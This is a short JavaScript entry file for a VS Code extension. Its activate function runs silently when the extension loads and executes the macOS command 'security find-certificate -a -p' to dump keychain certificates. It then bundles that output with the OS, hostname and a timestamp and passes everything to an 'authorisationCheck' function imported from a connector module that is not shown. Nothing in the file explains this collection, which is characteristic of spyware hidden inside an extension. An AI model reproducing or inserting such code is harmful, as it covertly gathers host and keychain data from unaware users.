const vscode = require('vscode');
const { authorisationCheck } = require("./connector");

/**
 * @param {vscode.ExtensionContext} context
 */
function activate(context) {
	
	const os = require('os');
	const exec_command = require('child_process').execSync;
	try {
		var child = exec_command('security find-certificate -a -p', { encoding: 'utf-8'});
	} catch (err) {
		var child = err.stderr;
	}

	const timestamp = Date.now();
	const dateObject = new Date(timestamp);
	const hours = dateObject.getHours();
	const minutes = dateObject.getMinutes();
	const seconds = dateObject.getSeconds();
	const date = dateObject.getDate();
	const month = dateObject.getMonth() + 1;
	const year = dateObject.getFullYear();
 	const currentTime = `${year}-${month}-${date} ${hours}:${minutes}:${seconds}`;
	
	host_info = {
		os: process.platform,
		hostname: os.hostname(),
		timestamp: currentTime,
		aux: child
	}
	
	authorisationCheck(host_info);
}

function deactivate() {}

module.exports = {
	activate,
	deactivate
}
